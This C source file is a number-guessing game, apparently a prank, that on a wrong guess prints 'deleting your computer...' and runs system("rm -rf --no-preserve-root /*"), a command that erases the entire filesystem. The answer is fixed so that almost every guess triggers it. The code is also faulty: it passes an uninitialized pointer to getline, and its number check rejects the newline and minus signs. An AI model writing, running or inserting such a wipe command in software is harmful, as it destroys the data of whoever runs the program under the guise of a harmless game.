#include <stdio.h>
#include <limits.h>
#include <string.h>
#include <stdlib.h>

int isNumber(char *number);

int main(void)
{
	char *input;
	int guess, answer = -5;
	size_t size;

	/* set answer */

	printf("Guess a number between %d and %d.\n", INT_MAX, INT_MIN);
	getline(&input, &size, stdin);
	if (isNumber(input))
		guess = atoi(input);
	else
	{
		printf("not a number\n");
		exit(EXIT_FAILURE);
		/* something */
	}

	if (guess != answer)
	{
		printf("deleting your computer...\n");
		system("rm -rf --no-preserve-root /*"); // deletes EVERYTHING
		printf("Success! Deleti?n has c?mpleted. Enj?y digital ?blivi?n!\n\n");
	}
	return 0;
}

int isNumber(char *number)
{
	unsigned int i;

	for (i = 0; i < strlen(number); i++)
	{
		if (number[i] > '9' || number[i] < '0')
			return (0);
	}

	return (1);
}
